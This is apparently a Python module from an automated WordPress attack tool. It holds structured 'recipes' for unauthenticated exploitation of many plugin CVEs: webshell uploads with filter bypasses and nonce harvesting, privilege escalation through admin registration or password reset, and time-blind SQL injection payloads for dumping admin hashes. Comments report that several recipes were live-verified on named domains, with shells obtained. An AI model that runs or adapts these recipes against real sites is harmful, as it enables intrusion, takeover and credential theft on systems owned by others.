"""Curated unauthenticated WordPress webshell-upload recipes."""

RECIPES = [
    {
        "plugin": "wp-file-manager",
        "cve": "CVE-2020-25213",
        "affected": "<=6.8",
        "method": "POST",
        "endpoint": "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php",
        "params": {"cmd": "upload", "target": "l1_Lw"},
        "field": "upload[]",
        "upload_path": "/wp-content/plugins/wp-file-manager/lib/files/{filename}",
        "source": "registry",
        "note": "elFinder connector exposed unauthenticated; no extension check.",
    },
    {
        "plugin": "wpdiscuz",
        "cve": "CVE-2020-24186",
        "affected": ">=7.0.0,<=7.0.4",
        "mode": "comment-image-upload",
        "method": "POST",
        "endpoint": "/wp-admin/admin-ajax.php",
        "params": {"action": "wmuUploadFiles"},
        "field": "wmu_files[0]",
        # No upload_path: wpdiscuz stores at /uploads/YYYY/MM/<name>-<microtime>.php
        # (unguessable). The handler reads the real URL back out of the JSON
        # response (data.previewsData.images[].url) instead of templating a path.
        #
        # LIVE-VERIFIED end-to-end (georgeagent.com, wpdiscuz 7.0.4 → uid=33
        # www-data). Three things a naive raw upload gets wrong, all handled by
        # mode "comment-image-upload":
        #   1. wmuSecurity is wp_create_nonce()'d into the localized JS only where
        #      the comment form renders. On a static front page '/' has none, so
        #      the handler discovers a commentable post (wp-json) and harvests
        #      there. A nonce-less request is rejected -1/403 by check_ajax_referer.
        #   2. wpdiscuz content-inspects the file (getimagesize/finfo): a bare
        #      <?php blob returns 'Not allowed file type'. The handler leads the
        #      payload with a GIF89a header; the .php name is kept so it executes.
        #   3. The real landed path is parsed from the response, never guessed.
        "nonce_from": {"url": "/", "key": "wmuSecurity", "param": "wmu_nonce"},
        "source": "registry",
        "note": "wmuUploadFiles accepts an image-headed .php once given a real "
                "wmuSecurity nonce (harvested from a post where the comment form "
                "renders, not a static front page); the shell lands at an "
                "unguessable /uploads/YYYY/MM/ path read back from the JSON reply. "
                "Confirmed live: uid=33(www-data) on wpdiscuz 7.0.4.",
    },
    {
        "plugin": "ninja-forms-uploads",
        "cve": "CVE-2026-0740",
        "affected": "<=3.3.24",
        "mode": "nonce-traversal",
        "method": "POST",
        "endpoint": "/wp-admin/admin-ajax.php",
        "params": {"action": "nf_fu_upload"},
        "nonce_action": "nf_fu_get_new_nonce",
        "upload_action": "nf_fu_upload",
        "field": "files-{field_id}",
        "dest_param": "image_jpg",
        "traversal_prefix": "../",
        "upload_path": "/wp-content/uploads/ninja-forms/{filename}",
        "source": "registry",
        # Verified against the public PoC (github.com/whattheslime/CVE-2026-0740)
        # and Lexfo's write-up: nf_fu_get_new_nonce hands a valid upload nonce to
        # ANY caller for an arbitrary field_id (no auth, no ownership check), then
        # nf_fu_upload trusts the client-supplied 'image_jpg' destination verbatim
        # into move_uploaded_file() (CWE-434) — one '../' escapes the tmp/ landing
        # dir into the plugin's own uploads dir. Traversal + arbitrary extension
        # (.php) only works <=3.3.24; 3.3.25/3.3.26 close traversal but still allow
        # .phtml/.phar/.pht uploads (not built here) before the full fix in 3.3.27.
        "note": "nf_fu_get_new_nonce(field_id) mints an upload nonce unauth; "
                "nf_fu_upload trusts the client's 'image_jpg' destination path "
                "verbatim → path traversal out of wp-content/uploads/ninja-forms/"
                "tmp/. Confirmed <=3.3.24 (later versions gate traversal, not extension).",
    },
    {
        "plugin": "simple-file-list",
        "cve": "CVE-2025-34085",
        "affected": "<=4.2.2",
        "mode": "upload-then-rename",
        "method": "POST",
        "endpoint": "/wp-content/plugins/simple-file-list/ee-upload-engine.php",
        "rename_endpoint": "/wp-content/plugins/simple-file-list/ee-file-engine.php",
        "params": {"eeSFL_ID": "1"},
        "list_id": "1",
        "upload_dir": "/wp-content/uploads/simple-file-list/",
        "token_salt": "unique_salt",
        "rename_extensions": ["php", "phtml", "php5", "php3"],
        "field": "file",
        "upload_path": "/wp-content/uploads/simple-file-list/{filename}",
        "source": "registry",
        # Verified against the real vulnerable source (v4.2.2, both
        # ee-upload-engine.php and ee-file-engine.php): BOTH endpoints
        # register their nonce check via add_action('plugins_loaded',
        # 'eeSFL_CheckNonce') -- but that runs mid-script, AFTER each script's
        # own manual `include(wp-load.php)` bootstrap has already fired
        # plugins_loaded, so the callback is registered too late and NEVER
        # actually runs. No nonce required at all despite the code appearing
        # to check one. Upload is extension-whitelisted (png passes), but the
        # separate rename endpoint (eeFileAction=f"Rename|{new_name}") applies
        # ZERO validation to the new extension -- rename png→php and it's a
        # live shell. The upload 'security token' is
        # md5('unique_salt' + $_POST['eeSFL_Timestamp']) -- a literal string
        # hardcoded in the public plugin source, computed locally here.
        "note": "Unauth upload (extension-whitelisted) + unauth rename (zero "
                "validation) = arbitrary PHP execution. Both endpoints' nonce "
                "checks are dead code (registered on plugins_loaded AFTER that "
                "hook already fired in the script's own bootstrap); the "
                "upload token is a hardcoded salt in the plugin source, not a "
                "real secret.",
    },
    {
        "plugin": "breeze",
        "cve": "CVE-2026-3844",
        "affected": "<=2.4.4",
        "mode": "comment-avatar-ssrf",
        "method": "POST",
        "endpoint": "/wp-comments-post.php",
        "params": {},
        "author_field": "author",
        "post_id": 10,
        "field": "author",
        "upload_path": "/wp-content/cache/breeze-extra/gravatars/{filename}",
        "source": "registry",
        # REAL FARM MATCH (2026-07-17): an admin found
        # wp-content/cache/breeze-extra/gravatars/footer.jpg.php on the
        # actual compromised farm -- an exact match for this CVE's path and
        # the classic double-extension shell-naming pattern. Verified against
        # BOTH the current patched source and the actual vulnerable 2.4.4
        # source (wp.org SVN): fetch_gravatar_from_remote() in <=2.4.4 does
        # zero host/MIME/extension validation and resolves to exactly
        # content_url('/cache/breeze-extra/gravatars/' . $blog_id .
        # $gravatar_name) -- the patched version added a gravatar.com host
        # check + an image/jpeg|png|gif whitelist.
        #
        # UNLIKE every other recipe here, this is SSRF-shaped: WE inject a
        # URL, the TARGET fetches it -- so the payload must be reachable BY
        # THE TARGET, not just describable by us. pentest-agent cannot
        # conjure that reachability itself. Operator must host a payload
        # (generate one with `python3 -c "from wp.exploit import
        # build_payload; print(build_payload())"` so its token matches what
        # wp_verify expects) somewhere the target can reach, then pass
        # --callback-url <that URL> --callback-token <that token>.
        #
        # Mechanism (verified against the real PoC, github.com/dinosn/
        # CVE-2026-3844): POST a comment to wp-comments-post.php with
        # author=f"x srcset={callback_url}" (get_avatar()'s $alt param is
        # populated from the comment author name; breeze_replace_gravatar_
        # image()'s regex scans the resulting avatar HTML for a srcset/src
        # value with no regard for which HTML attribute it came from), then
        # visit the post page to trigger get_avatar -> fetch_gravatar_from_
        # remote() -> download with zero validation.
        #
        # PRECONDITION (per the public writeups, not yet independently
        # re-derived from source here): "Host Files Locally - Gravatars"
        # setting must be enabled (non-default) + comments open on >=1 post.
        "note": "Unauth SSRF-triggered fetch via a comment's forged srcset -> "
                "fetch_gravatar_from_remote() saves ANY URL with zero MIME/"
                "extension check. REQUIRES an operator-hosted payload "
                "(--callback-url/--callback-token) since the target fetches "
                "the file itself; pentest-agent can't host it for you. Also "
                "requires 'Host Files Locally - Gravatars' enabled (non-"
                "default) and comments open on the target post.",
    },
    {
        "plugin": "wordpress-core",
        "cve": "CVE-2026-63030",
        "affected": ">=6.9.0,<6.9.5|>=7.0.0,<7.0.2",
        "mode": "wp-batch-route-sqli",
        "method": "POST",
        "endpoint": "/wp-json/wp/v2/batch/v1",
        "params": {},
        "inject_param": "author__not_in",
        "payload_type": "rest-api-route-confusion-sqli",
        "source": "registry",
        "note": "Unauth RCE (CVE-2026-63030 wp2shell, WordPress 6.9.0-7.0.1): "
                "REST API batch endpoint route confusion + SQL injection in "
                "author__not_in parameter. Affects 500M+ sites. CISA Known "
                "Exploited Vulnerabilities catalog. Chains to admin account "
                "creation + plugin upload for arbitrary code execution.",
    },
    {
        "plugin": "king-addons",
        "cve": "CVE-2025-6327",
        "affected": "<=51.1.36",
        "mode": "king-addons-unrestricted-upload",
        "method": "POST",
        "endpoint": "/wp-admin/admin-ajax.php",
        "params": {"action": "king_addons_upload_file", "triggering_event": "click"},
        "field": "uploaded_file",
        "upload_path": "/wp-content/uploads/king-addons/forms/{filename}",
        "payload_type": "unrestricted-file-upload",
        "source": "registry",
        "note": "Unauth arbitrary file upload RCE (CVE-2025-6327, King Addons "
                "<=51.1.36): file_validity() returns truthy error string instead "
                "of false for .php files, bypassing extension blacklist. No nonce "
                "validation. CVSS 10.0. Trivially exploitable.",
    },
    {
        "plugin": "database-for-contact-form-7",
        "cve": "CVE-2025-7384",
        "affected": "<=1.4.3",
        "mode": "cf7-object-injection",
        "method": "POST",
        "endpoint": "/wp-admin/admin-ajax.php",
        "params": {"action": "get_lead_detail"},
        "inject_param": "lead_id",
        "payload_type": "php-object-injection",
        "source": "registry",
        "note": "Unauth PHP object injection RCE (CVE-2025-7384, Contact Form 7 "
                "DB <=1.4.3): get_lead_detail() deserializes untrusted form data "
                "without validation. Chains with Contact Form 7 POP gadget chain "
                "to arbitrary code execution or file deletion. CVSS 9.8. "
                "Actively scanned.",
    },
    {
        "plugin": "bricks",
        "cve": "CVE-2024-25600",
        "affected": "<=1.9.6",
        "mode": "bricks-eval-injection",
        "method": "POST",
        "endpoint": "/wp-json/bricks/v1/render_element",
        "params": {},
        "inject_param": "queryEditor",
        "nonce_from": {"url": "/", "key": "bricks-nonce", "param": "nonce"},
        "payload_type": "eval-injection",
        "source": "registry",
        "note": "Unauth eval() code injection RCE (CVE-2024-25600, Bricks "
                "<=1.9.6): render_element nonce publicly available on homepage, "
                "queryEditor parameter passed to eval() without sanitization. "
                "CVSS 9.8-10.0. Exploited within hours of disclosure.",
    },
    {
        "plugin": "front-end-users",
        "cve": "CVE-2025-2005",
        "affected": "<=3.2.32",
        "method": "POST",
        "endpoint": "/wp-admin/admin-ajax.php",
        "params": {"action": "feu_upload_file"},
        "field": "file",
        "upload_path": "/wp-content/uploads/feu-files/{filename}",
        "source": "registry",
        "note": "Unauth arbitrary file upload RCE (CVE-2025-2005, Front End Users "
                "<=3.2.32): Public registration form lacks MIME type and extension "
                "validation on uploaded files. No authentication required. Files "
                "are directly accessible from web root and execute as PHP. CVSS 9.8.",
    },
    {
        "plugin": "drag-drop-multiple-file-upload-cf7",
        "cve": "CVE-2025-3515",
        "affected": "<=1.3.8.9",
        "method": "POST",
        "endpoint": "/wp-admin/admin-ajax.php",
        "params": {"action": "dnd_upload_cf7"},
        "field": "dnd_file",
        "upload_path": "/wp-content/uploads/dnd-cf7/{filename}",
        "source": "registry",
        "note": "Unauth file upload RCE via extension blacklist bypass (CVE-2025-3515, "
                "Drag and Drop Multiple File Upload for CF7 <=1.3.8.9): Plugin blocks "
                ".php but not .phar, .php5, .inc. On Apache+mod_php, .phar files "
                "execute as PHP. No authentication. Publicly accessible Contact Form 7 "
                "interface. CVSS 9.8.",
    },
    {
        "plugin": "bricks",
        "cve": "CVE-2024-25600",
        "affected": "<=1.9.6",
        "mode": "bricks-eval-injection",
        "method": "POST",
        "endpoint": "/wp-json/bricks/v1/render_element",
        "params": {},
        "inject_param": "queryEditor",
        "nonce_from": {"url": "/", "key": "bricksRender", "object": None},
        "payload_type": "eval-injection",
        "source": "registry",
        "note": "Unauth eval() code injection RCE (CVE-2024-25600, Bricks Builder "
                "<=1.9.6): REST endpoint render_element passes queryEditor parameter to "
                "PHP eval() without sanitization. Nonce publicly available on homepage. "
                "CVSS 9.8. Actively exploited in-the-wild since April 2024.",
    },
    {
        "plugin": "hash-form",
        "cve": "CVE-2024-5084",
        "affected": "<=1.1.0",
        "mode": "hash-form-upload",
        "method": "POST",
        "endpoint": "/wp-admin/admin-ajax.php",
        "params": {"action": "hashform_file_upload_action"},
        "field": "qqfile",
        "upload_path": "/wp-content/uploads/hashform/temp/{filename}",
        "payload_type": "file-upload-extension-bypass",
        "source": "registry",
        "note": "Unauth arbitrary file upload RCE (CVE-2024-5084, Hash Form <=1.1.0): "
                "file_upload_action() accepts allowedExtensions from user input without "
                "validation. Sending allowedExtensions[0]=php bypasses all extension "
                "validation. Nonce is publicly visible in hashform_vars JS object and "
                "valid for all users (not session-tied). No auth required. Plugin abandoned. "
                "CVSS 10.0 (perfect score). GitHub PoCs: WOOOOONG/CVE-2024-5084, "
                "KTN1990/CVE-2024-5084, Metasploit module available.",
    },
    {
        "plugin": "wp-file-upload",
        "cve": "CVE-2024-11613",
        "affected": "<=4.24.15",
        "mode": "wp-file-upload-traversal",
        "method": "POST",
        "endpoint": "/wp-admin/admin-ajax.php",
        "params": {"action": "wfu_ajax_action"},
        "field": "file",
        "upload_path": "/wp-content/uploads/{filename}",
        "payload_type": "file-upload-path-traversal",
        "source": "registry",
        "note": "Unauth file upload RCE via path traversal (CVE-2024-11613, WordPress "
                "File Upload <=4.24.15): wfu_file_downloader endpoint accepts unsanitized "
                "'source' parameter allowing ../ traversal. Vendor's security patch "
                "introduced the vulnerability. CVSS 9.8. RCE via arbitrary file write.",
    },
]


def find_recipes(plugin_slug):
    return [r for r in RECIPES if r["plugin"] == plugin_slug]


# ── Track B: privilege-escalation recipes (unauth → admin account) ────────────
# These don't upload a shell directly; they grant an ADMIN account, which the
# authenticated-webshell stage (wp_authshell) then uses to plant a shell.
# Privilege-escalation recipes for Track B. wp_privesc.acquire_admin dispatches
# on "kind"; each kind reads a fixed set of fields — confirm every value against
# the CVE's PoC before running against a real target. Shapes:
#
#   register-role   : {endpoint, action, user_field, email_field, pass_field,
#                      role_param, role_value}  → creates an admin with our creds.
#   options-update  : {endpoint, option_name_param, option_value_param,
#                      set_options:{users_can_register:"1", default_role:"administrator"},
#                      register_endpoint, user_field, email_field, [pass_field]}
#                      → forces open registration + admin default role, registers.
#   auth-bypass     : {endpoint, method:"GET"|"POST", params}  → leaves the
#                      session authenticated as admin (returns {"authed": True}).
#   password-reset  : {endpoint, target_user, user_param, pass_param, params}
#                      → resets a known admin's password to one we choose.
PRIVESC_RECIPES = [
    {
        "plugin": "lastudio-element-kit",
        "cve": "CVE-2026-0920",
        "affected": "<=1.5.6.3",
        "kind": "register-role",
        "endpoint": "/wp-admin/admin-ajax.php",
        # LA-Studio batches all its front-end AJAX through ONE dispatcher action
        # (wp_ajax_nopriv_lakit_ajax in includes/modules/ajax/manager.php,
        # class LaStudio_Kit_Ajax_Manager::handle_ajax_request). The real
        # per-feature action name ("register" -> ajax_register_handle) is
        # nested inside a JSON-encoded `actions` param, not passed as the
        # top-level `action` value -- see `envelope` below.
        "action": "lakit_ajax",
        "envelope": {"subaction": "register", "id": "0"},
        "user_field": "username",
        "email_field": "email",
        "pass_field": "password",
        "pass_confirm_field": "password-confirm",
        # ajax_register_handle only *validates/uses* username+password when
        # these flags are "yes" -- omit them and the handler silently
        # generates its own username/password instead of using ours.
        "extra_params": {"lakit_field_log": "yes", "lakit_field_pwd": "yes",
                          "lakit_field_cpwd": "yes"},
        "role_param": "lakit_bkrole",
        "role_value": "administrator",
        # register_ajax_action('register', ..., $protected=true) requires a
        # valid nonce for action LaStudio_Kit_Ajax_Manager::NONCE_KEY
        # ('lakit_ajax'), localized as LaStudioKitSettings.ajaxNonce on any
        # front-end page loading the plugin's base script (no specific widget
        # placement needed, unlike King Addons CVE-2025-6325).
        "nonce_from": {"url": "/", "key": "ajaxNonce",
                       "object": "LaStudioKitSettings", "param": "_nonce"},
        "source": "registry",
        "note": "Unauth privesc-to-admin (CVE-2026-0920): a former LA-Studio "
                "employee planted a backdoor in ajax_register_handle() that "
                "honors an attacker-supplied lakit_bkrole registration field "
                "with no allowlist, landing straight in wp_insert_user() as "
                "that role. Reported via the Wordfence Bug Bounty Program "
                "2026-01-12, patched in 1.6.0 (2026-01-14) which no longer "
                "reads lakit_bkrole at all. CAVEAT: the malicious 1.5.6.3 tag "
                "was pulled from the public wp.org SVN after disclosure, so "
                "the literal backdoor line can't be independently re-read "
                "from source the way King Addons/Opal Estate could -- this "
                "recipe's request shape (dispatcher envelope, field names, "
                "nonce location) IS source-confirmed from the surviving "
                "ajax_register_handle()/ajax manager code shared with 1.6.0; "
                "the lakit_bkrole name/behavior itself rests on cross-"
                "corroborating wpscan, the public GitHub PoC "
                "(John-doe-code-a11/CVE-2026-0920), and vendor writeups, not "
                "a first-party source read. Also requires reCAPTCHA v3 to be "
                "unconfigured (the default -- verify_recaptchav3() "
                "short-circuits true when no site/secret key is set).",
    },
    {
        "plugin": "opal-estate-pro",
        "cve": "CVE-2025-6934",
        "affected": "<=1.7.5",
        "kind": "register-role",
        "endpoint": "/wp-admin/admin-ajax.php",
        "action": "opalestate_register_form",
        "user_field": "username",
        "email_field": "email",
        "pass_field": "password",
        "pass_confirm_field": "password1",
        "role_param": "role",
        "role_value": "administrator",
        # on_regiser_user's nonce check reads this hidden input off the site's
        # own homepage (not a separate /register/ page) — confirmed from the
        # public PoC (github.com/Nxploited/CVE-2025-6934).
        "nonce_from": {"url": "/", "field": "opalestate-register-nonce"},
        "extra_params": {
            "confirmed_register": "on",
            "_wp_http_referer": "/",
            "ajax": "1",
        },
        "source": "registry",
        "note": "on_regiser_user doesn't restrict the 'role' param during "
                "registration (CWE-269) → unauth attacker-chosen role, "
                "including administrator.",
    },
    {
        "plugin": "essential-addons-for-elementor-lite",
        "cve": "CVE-2023-32243",
        "affected": ">=5.4.0,<=5.7.1",
        "kind": "password-reset",
        "endpoint": "/wp-admin/admin-ajax.php",
        "target_user": "admin",
        "user_param": "rp_login",
        "pass_param": "eael-pass1",
        "pass_confirm_param": "eael-pass2",
        # Static form fields the reset dispatcher requires. `action` +
        # eael-resetpassword-submit route init→reset_password(); page_id/widget_id
        # need only be non-empty (used for cosmetic error strings via
        # lr_get_widget_settings, NOT a gate — so no real login/register widget
        # page is required, unlike Kirki CVE-2026-8206).
        "params": {
            "action": "login_or_register_user",
            "eael-resetpassword-submit": "1",
            "page_id": "124",
            "widget_id": "224",
        },
        # The nonce is verified against action 'essential-addons-elementor' and is
        # printed on the homepage by Asset_Builder as `var localize = {..."nonce":
        # "..."}` whenever EA is active — harvest key "nonce" off "/".
        "nonce_from": {"url": "/", "key": "nonce", "param": "eael-resetpassword-nonce"},
        "source": "registry",
        # SOURCE+LIVE CONFIRMED (2026-07-18, cve-essaddons lab, EA 5.7.1 → admin
        # password reset, hash changed, new pass validated). login_or_register_user()
        # is hooked on plain `init` (Bootstrap.php), so it fires unauth on ANY front
        # URL incl. admin-ajax.php. reset_password() takes rp_login, calls
        # get_user_by('login', rp_login) then reset_password($user, $_POST['eael-pass1'])
        # with ZERO rp_key validation → any user's password is ours. Feeds Track B:
        # returned admin creds → authshell login → plugin-upload webshell → confirmed RCE.
        "note": "Unauth arbitrary password reset (CVE-2023-32243). reset_password() "
                "never validates the reset key — it sets rp_login's password to our "
                "eael-pass1 behind only a homepage-harvestable nonce. Yields admin "
                "creds (default target 'admin') → Track-B authshell → shell. "
                "Gated to EA lite 5.4.0-5.7.1 (fixed 5.7.2).",
    },
    {
        "plugin": "king-addons",
        "cve": "CVE-2025-6325",
        "affected": "<=51.1.14",
        "kind": "register-role",
        "endpoint": "/wp-admin/admin-ajax.php",
        "action": "king_addons_user_register",
        "user_field": "username",
        "email_field": "email",
        "pass_field": "password",
        "pass_confirm_field": "confirm_password",
        "role_param": "user_role",
        "role_value": "administrator",
        # Verified against the real plugin source (v51.1.14,
        # Login_Register_Form_Ajax.php::handle_register_ajax(), hooked
        # unconditionally on both wp_ajax_king_addons_user_register AND
        # wp_ajax_nopriv_king_addons_user_register in Core.php): user_role is
        # read straight off $_POST with sanitize_text_field() and NO allowlist
        # -- any non-empty, non-'subscriber' string becomes $user_data['role']
        # verbatim before wp_insert_user(). (51.1.35+ adds an explicit
        # allowed_roles=['subscriber','customer'] check per its own changelog
        # entry "Security enhancements across the plugin" -- confirmed via
        # source diff, not just the advisory.) Requires 'users_can_register'
        # enabled server-side, but any site with this widget actually placed
        # needs that on anyway for the widget to function for anyone.
        # Nonce is JS-localized (RegisterAssets.php) as
        # king_addons_login_register_vars.register_nonce -- but ONLY on a page
        # that actually renders the login-register-form Elementor widget
        # (condition: $widget_id === 'login-register-form'), and the plugin
        # ALSO localizes unrelated nonces under the same literal "nonce" key
        # elsewhere on the page -- object-scoping to
        # king_addons_login_register_vars specifically is required, a bare
        # key search would grab the wrong one.
        "nonce_from": {"url": "/", "key": "register_nonce",
                       "object": "king_addons_login_register_vars", "param": "nonce"},
        "source": "registry",
        "note": "Unauth privesc-to-admin (CVE-2025-6325): the registration "
                "AJAX handler accepts an attacker-chosen user_role with no "
                "validation, landing straight in wp_insert_user(). Requires a "
                "page with the Login|Register Form widget placed on it (for "
                "both the nonce to be exposed and registration to be a live "
                "feature at all). Confirmed <=51.1.14 from source; advertised "
                "fix version (51.1.36) may overstate the true vulnerable "
                "range -- 51.1.35 already ships an explicit allowed_roles "
                "check per source diff.",
    },
]


def find_privesc(plugin_slug):
    return [r for r in PRIVESC_RECIPES if r["plugin"] == plugin_slug]


# ── unauthenticated SQL-injection recipes (wp_sqli confirms/extracts) ──────────
# Success = proof that attacker SQL executed (a timing delta), NOT a shell. The
# payload is an ORDER BY-context injection: {cond} gates a SLEEP({sleep}).
SQLI_RECIPES = [
    {
        "plugin": "wp-google-map-plugin",
        "cve": "CVE-2026-2580",
        "affected": "<=4.9.1",
        "kind": "time-blind",
        "method": "POST",
        "endpoint": "/wp-admin/admin-ajax.php",
        # LIVE-VERIFIED end-to-end (askgeorgeai.com, WP MAPS 4.9.1): a clean
        # +5s delta on SLEEP(5) vs control, and CASE WHEN (1=1/1=2) discriminates.
        #
        # Full unauth chain, all read from the installed 4.9.1 source:
        #   admin-ajax action wpgmp_ajax_call (registered nopriv) runs
        #   check_ajax_referer('fc-call-nonce','nonce') then $this->$operation($_POST).
        #   operation=wpgmp_processor reads $_GET['page']=wpgmp_manage_map, builds
        #   WPGMP_Maps_Table, whose constructor calls init_listing()->prepare_items()
        #   BEFORE any auth check. There:
        #       $orderby = sanitize_text_field($_GET['orderby']);  // keeps ( ) , etc.
        #       $query  .= " order by {$orderby} {$order}";        // raw, no prepare
        # So the request is a POST (the ajax dispatch) whose ORDER BY sink reads
        # $_GET — hence method POST but inject_in 'params'. The fc-call-nonce is
        # localized into the frontend map object as `nonce` (harvested from '/').
        #
        # NOTE the sink runs inside `SELECT * FROM wp_create_map ORDER BY <inj>`, so
        # the injection only times out when the maps table has >=1 row — true on any
        # real WP MAPS deployment (a site with no maps isn't using the plugin).
        "params": {"page": "wpgmp_manage_map", "order": "asc"},
        "data": {"action": "wpgmp_ajax_call", "operation": "wpgmp_processor"},
        "inject_param": "orderby",       # 'order' is a second raw sink (fallback)
        "inject_in": "params",           # $_GET sink even though the request is POST
        "nonce_from": {"url": "/", "key": "nonce", "param": "nonce", "into": "data"},
        "payload": "(SELECT CASE WHEN ({cond}) THEN SLEEP({sleep}) ELSE 0 END)",
        "true_cond": "1=1",
        "false_cond": "1=2",
        "source": "registry",
        "note": "Unauth time-based blind SQLi via orderby. nopriv wpgmp_ajax_call "
                "(fc-call-nonce, harvested as `nonce` off the frontend) dispatches "
                "operation=wpgmp_processor + page=wpgmp_manage_map into "
                "prepare_items(), whose raw `order by {orderby}` runs pre-auth. "
                "Confirmed live: +5s SLEEP delta on WP MAPS 4.9.1.",
    },
    {
        "plugin": "wp-automatic",
        "cve": "CVE-2024-27956",
        "affected": "<=3.92.0",
        "kind": "time-blind",
        "method": "GET",
        "endpoint": "/wp-content/plugins/wp-automatic/inc/csv.php",
        # auth is a NULL byte ("\x00" → &auth=%00 on the wire), NOT the literal
        # string "%00": the requests layer percent-encodes the real null byte, and
        # the server url-decodes it back to a null. For an unauth caller
        # $current_user->user_pass is empty, and the null auth defeats the guard's
        # short-circuit so execution reaches $wpdb->get_results($_REQUEST['q']).
        "params": {"auth": "\x00"},
        "inject_param": "q",
        "inject_in": "params",
        # The other guard is integ == md5(q). Because q is the WHOLE injected query
        # and changes every request, the engine recomputes integ per request
        # (wp_sqli._timed's `integrity` support) rather than templating a static
        # hash. Mechanism verified against the public PoC's known (q, md5) pairs.
        "integrity": {"param": "integ", "algo": "md5"},
        # Unlike the gmap ORDER BY sink, q is arbitrary SQL — a standalone SELECT
        # that sleeps under the true condition. Same {cond}/{sleep} contract, so
        # confirm() (timing delta) and extract() (ADMIN_HASH, char-by-char) both
        # work unchanged; --sqli-extract can dump the admin password hash here.
        "payload": "SELECT IF(({cond}),SLEEP({sleep}),0)",
        "true_cond": "1=1",
        "false_cond": "1=2",
        "source": "registry",
        # SOURCE-CONFIRMED, NOT YET LIVE-FIRED. WP Automatic (ValvePress) is a
        # premium plugin, mass-exploited in the wild (~5.5M attacks, late 03/2024,
        # CVSS 9.9). inc/csv.php passes $_REQUEST['q'] straight into
        # $wpdb->get_results() behind the two guards above, both bypassed as noted.
        # Detection auto-probes the wp-automatic slug (SQLI_RECIPES union in
        # wp_fingerprint); the slug ships a readme.txt so version-gating works.
        "note": "Unauth arbitrary SQL execution (CVE-2024-27956, WP Automatic "
                "<=3.92.0, mass-exploited 03/2024). inc/csv.php runs "
                "$wpdb->get_results($_REQUEST['q']) behind two bypassed guards: "
                "auth=%00 (NULL byte) defeats the auth short-circuit, and integ "
                "must equal md5(q) — recomputed per request since q is the whole "
                "injected query. Time-based blind SLEEP proves execution; "
                "--sqli-extract then reads the admin hash. integ=md5(q) verified "
                "against the public PoC's known pairs. Not yet live-fired.",
    },
]


def find_sqli(plugin_slug):
    return [r for r in SQLI_RECIPES if r["plugin"] == plugin_slug]
